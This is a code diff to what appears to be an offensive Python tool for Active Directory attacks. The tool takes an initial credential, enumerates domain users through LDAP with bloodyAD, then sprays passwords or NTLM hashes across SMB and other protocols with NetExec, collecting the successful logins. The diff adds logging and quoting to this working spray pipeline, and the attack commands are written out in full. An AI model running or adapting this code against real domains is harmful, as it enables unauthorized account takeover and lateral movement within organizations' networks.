@@ -16,6 +16,7 @@ def start_spraying(context):
         watch_creds(context)
 
 def enum_users(context):
+    write_log(context.log_file, "Initial credential discovered. Enumerating users via LDAP...")
     target = context.get_target()
     user, passwd = context.get_initial_cred()
     cmd = f"bloodyAD --host {target} -d {context.domain} -u {user} -p '{passwd}' get search --filter objectClass=User --attr sAMAccountName | grep sAMAccountName | awk '{{print $2}}'"
@@ -46,7 +47,6 @@ def enum_users(context):
         write_log(context.log_file, f"bloodyAD subprocess returned non-zero code", "ERROR")
 
 def spray_passwd(target, users_file, passwd, sprayable_ports, log_file):
-    # write_log(log_file, f"spray_passwd called for passwd: {passwd}")
     valid_protos = {}
     for proto in sprayable_ports.values():
         if is_ntlm_hash(passwd):
@@ -56,10 +56,10 @@ def spray_passwd(target, users_file, passwd, sprayable_ports, log_file):
         else:
             auth_flag = '-p'
         if proto == 'smb':
-            cmd = f"nxc {proto} {target} -u {users_file} {auth_flag} {passwd} -k --continue-on-success"
+            cmd = f"nxc smb {target} -u {users_file} {auth_flag} '{passwd}' -k --continue-on-success"
         else:
-            cmd = f"nxc {proto} {target} -u {users_file} {auth_flag} {passwd} --continue-on-success"
-        # write_log(log_file, f"Executing: {cmd}\n")
+            cmd = f"nxc {proto} {target} -u {users_file} {auth_flag} '{passwd}' --continue-on-success"
+        # write_log(log_file, f"Executing: {cmd}")
         try:
             result = subprocess.run(
                 cmd,
@@ -76,6 +76,7 @@ def spray_passwd(target, users_file, passwd, sprayable_ports, log_file):
             write_log(log_file, f"NetExec subprocess error: {str(e)}", "ERROR")
             continue
         if result.returncode == 0:
+            # write_log(log_file, f"")
             # for line in result.stdout.split('\n'):
             #     write_log(log_file, f"{line.strip()}")
             success_lines = [line.strip() for line in result.stdout.split('\n') if '[+]' in line]
